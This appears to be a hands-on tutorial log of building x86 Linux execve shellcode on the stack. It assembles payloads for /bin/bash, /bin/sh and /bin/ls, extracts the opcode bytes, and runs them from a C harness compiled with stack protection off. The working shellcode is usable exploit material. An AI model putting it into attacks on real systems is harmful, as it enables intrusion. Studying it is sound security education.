@@ -1,0 +1,181 @@
+Execve Shellcode Stack Technique
+
+1.) String reverse using python
+kan1shka9@dev:~/Desktop/Remain/27$ ls
+execve-stack.nasm  reverse.py
+kan1shka9@dev:~/Desktop/Remain/27$ python reverse.py "////bin/bash"
+String Length : 12
+hsab : 68736162
+/nib : 2f6e6962
+//// : 2f2f2f2f
+
+2.) Assemble and run
+kan1shka9@dev:~/Desktop/Remain/27$ ./compile_ld.sh execve-stack
+[+] Assebling with Nasm ...
+[+] Linking ...
+[+] Done!
+kan1shka9@dev:~/Desktop/Remain/27$ ls
+compile_ld.sh  execve-stack  execve-stack.nasm  execve-stack.o  reverse.py
+kan1shka9@dev:~/Desktop/Remain/27$ ./execve-stack
+kan1shka9@dev:/home/kan1shka9/Desktop/Remain/27$ ps
+  PID TTY          TIME CMD
+ 3092 pts/3    00:00:01 bash
+ 3752 pts/3    00:00:00 bash
+ 3769 pts/3    00:00:00 ps
+ 
+3.) Check for bad characters
+kan1shka9@dev:/home/kan1shka9/Desktop/Remain/27$ objdump -d ./execve-stack -M intel
+
+./execve-stack:     file format elf32-i386
+
+
+Disassembly of section .text:
+
+08048060 <_start>:
+ 8048060:       31 c0                   xor    eax,eax
+ 8048062:       50                      push   eax
+ 8048063:       68 62 61 73 68          push   0x68736162
+ 8048068:       68 62 69 6e 2f          push   0x2f6e6962
+ 804806d:       68 2f 2f 2f 2f          push   0x2f2f2f2f
+ 8048072:       89 e3                   mov    ebx,esp
+ 8048074:       50                      push   eax
+ 8048075:       89 e2                   mov    edx,esp
+ 8048077:       53                      push   ebx
+ 8048078:       89 e1                   mov    ecx,esp
+ 804807a:       b0 0b                   mov    al,0xb
+ 804807c:       cd 80                   int    0x80
+ 
+4.) Preparing shellcode
+kan1shka9@dev:~/Desktop/Remain/27$ objdump -d ./execve-stack|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
+"\x31\xc0\x50\x68\x62\x61\x73\x68\x68\x62\x69\x6e\x2f\x68\x2f\x2f\x2f\x2f\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
+kan1shka9@dev:~/Desktop/Remain/27$ cat -n shllcode.c
+     1  #include<stdio.h>
+     2  #include<string.h>
+     3
+     4  unsigned char code[] = \
+     5  "\x31\xc0\x50\x68\x62\x61\x73\x68\x68\x62\x69\x6e\x2f\x68\x2f\x2f\x2f\x2f\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";
+     6
+     7  main()
+     8  {
+     9
+    10      printf("Shellcode length: %d\n", strlen(code));
+    11
+    12      int (*ret)() = (int(*)())code;
+    13
+    14      ret();
+    15
+    16  }
+kan1shka9@dev:~/Desktop/Remain/27$ gcc -fno-stack-protector -z execstack shllcode.c -o shllcode
+kan1shka9@dev:~/Desktop/Remain/27$ ls
+compile_ld.sh  execve-stack  execve-stack.nasm  execve-stack.o  reverse.py  shllcode  shllcode.c
+kan1shka9@dev:~/Desktop/Remain/27$ ./shllcode
+Shellcode length: 30
+kan1shka9@dev:/home/kan1shka9/Desktop/Remain/27$ ps
+  PID TTY          TIME CMD
+ 3895 pts/16   00:00:00 bash
+ 4120 pts/16   00:00:00 bash
+ 4134 pts/16   00:00:00 ps
+ 
+5.) Converting to /bin/sh
+kan1shka9@dev:~/Desktop/Remain/27$ python reverse.py "/bin/sh"
+String Length : 7
+hs/ : 68732f
+nib/ : 6e69622f
+kan1shka9@dev:~/Desktop/Remain/27$ python reverse.py "//////bin/sh"
+String Length : 12
+hs/n : 68732f6e
+ib// : 69622f2f
+//// : 2f2f2f2f
+kan1shka9@dev:~/Desktop/Remain/27$ python reverse.py "/bin//sh"
+String Length : 8
+hs// : 68732f2f
+nib/ : 6e69622f
+kan1shka9@dev:~/Desktop/Remain/27$ ls
+compile_ld.sh  execve-stack.nasm  execve-stack-sh.nasm  shllcode
+execve-stack   execve-stack.o     reverse.py            shllcode.c
+kan1shka9@dev:~/Desktop/Remain/27$ ./compile_ld.sh execve-stack-sh
+[+] Assebling with Nasm ...
+[+] Linking ...
+[+] Done!
+kan1shka9@dev:~/Desktop/Remain/27$ ls
+compile_ld.sh  execve-stack.nasm  execve-stack-sh       execve-stack-sh.o  shllcode
+execve-stack   execve-stack.o     execve-stack-sh.nasm  reverse.py         shllcode.c
+kan1shka9@dev:~/Desktop/Remain/27$ ./execve-stack-sh
+$
+$
+$ ps
+  PID TTY          TIME CMD
+ 3895 pts/16   00:00:01 bash
+ 4190 pts/16   00:00:00 sh
+ 4194 pts/16   00:00:00 ps
+$ exit
+kan1shka9@dev:~/Desktop/Remain/27$ objdump -d ./execve-stack-sh|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
+kan1shka9@dev:~/Desktop/Remain/27$ ls
+compile_ld.sh  execve-stack  execve-stack.nasm  execve-stack.o  execve-stack-sh  execve-stack-sh.nasm  execve-stack-sh.o  reverse.py  shllcode  shllcode.c
+kan1shka9@dev:~/Desktop/Remain/27$ cp shllcode.c shellcode-sh.c
+kan1shka9@dev:~/Desktop/Remain/27$ ls
+compile_ld.sh  execve-stack  execve-stack.nasm  execve-stack.o  execve-stack-sh  execve-stack-sh.nasm  execve-stack-sh.o  reverse.py  shellcode-sh.c  shllcode  shllcode.c
+kan1shka9@dev:~/Desktop/Remain/27$ nano shellcode-sh.c
+kan1shka9@dev:~/Desktop/Remain/27$ gcc -fno-stack-protector -z execstack shellcode-sh.c -o shellcode-sh
+kan1shka9@dev:~/Desktop/Remain/27$ ./shellcode-sh
+Shellcode length: 25
+$ ps
+  PID TTY          TIME CMD
+ 3895 pts/16   00:00:01 bash
+ 4247 pts/16   00:00:00 sh
+ 4248 pts/16   00:00:00 ps
+$
+
+6.) Converting to /bin/ls
+kan1shka9@dev:~/Desktop/Remain/27$ python reverse.py "/bin/ls"
+String Length : 7
+sl/ : 736c2f
+nib/ : 6e69622f
+kan1shka9@dev:~/Desktop/Remain/27$ python reverse.py "/bin//ls"
+String Length : 8
+sl// : 736c2f2f
+nib/ : 6e69622f
+kan1shka9@dev:~/Desktop/Remain/27$ ls
+compile_ld.sh         execve-stack.nasm  execve-stack-sh.nasm  shellcode-sh    shllcode.c
+execve-stack          execve-stack.o     execve-stack-sh.o     shellcode-sh.c
+execve-stack-ls.nasm  execve-stack-sh    reverse.py            shllcode
+kan1shka9@dev:~/Desktop/Remain/27$ ./compile_ld.sh execve-stack-ls
+[+] Assebling with Nasm ...
+[+] Linking ...
+[+] Done!
+kan1shka9@dev:~/Desktop/Remain/27$ ls
+compile_ld.sh    execve-stack-ls.nasm  execve-stack.o        execve-stack-sh.o  shellcode-sh.c
+execve-stack     execve-stack-ls.o     execve-stack-sh       reverse.py         shllcode
+execve-stack-ls  execve-stack.nasm     execve-stack-sh.nasm  shellcode-sh       shllcode.c
+kan1shka9@dev:~/Desktop/Remain/27$ objdump -d execve-stack-ls
+
+execve-stack-ls:     file format elf32-i386
+
+
+Disassembly of section .text:
+
+08048060 <_start>:
+ 8048060:       31 c0                   xor    %eax,%eax
+ 8048062:       50                      push   %eax
+ 8048063:       68 2f 2f 6c 73          push   $0x736c2f2f
+ 8048068:       68 2f 62 69 6e          push   $0x6e69622f
+ 804806d:       89 e3                   mov    %esp,%ebx
+ 804806f:       50                      push   %eax
+ 8048070:       89 e2                   mov    %esp,%edx
+ 8048072:       53                      push   %ebx
+ 8048073:       89 e1                   mov    %esp,%ecx
+ 8048075:       b0 0b                   mov    $0xb,%al
+ 8048077:       cd 80                   int    $0x80
+kan1shka9@dev:~/Desktop/Remain/27$ objdump -d ./execve-stack-ls|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
+"\x31\xc0\x50\x68\x2f\x2f\x6c\x73\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
+kan1shka9@dev:~/Desktop/Remain/27$ cp shellcode-sh.c shellcode-ls.c
+kan1shka9@dev:~/Desktop/Remain/27$ ls
+compile_ld.sh  execve-stack-ls       execve-stack-ls.o  execve-stack.o   execve-stack-sh.nasm  reverse.py      shellcode-sh    shllcode
+execve-stack   execve-stack-ls.nasm  execve-stack.nasm  execve-stack-sh  execve-stack-sh.o     shellcode-ls.c  shellcode-sh.c  shllcode.c
+kan1shka9@dev:~/Desktop/Remain/27$ nano shellcode-ls.c
+kan1shka9@dev:~/Desktop/Remain/27$ gcc -fno-stack-protector -z execstack shellcode-ls.c -o shellcode-ls
+kan1shka9@dev:~/Desktop/Remain/27$ ./shellcode-ls
+Shellcode length: 25
+compile_ld.sh  execve-stack-ls       execve-stack-ls.o  execve-stack-sh.nasm  execve-stack.nasm  reverse.py    shellcode-ls.c  shellcode-sh.c  shllcode.c
+execve-stack   execve-stack-ls.nasm  execve-stack-sh    execve-stack-sh.o     execve-stack.o     shellcode-ls  shellcode-sh    shllcode
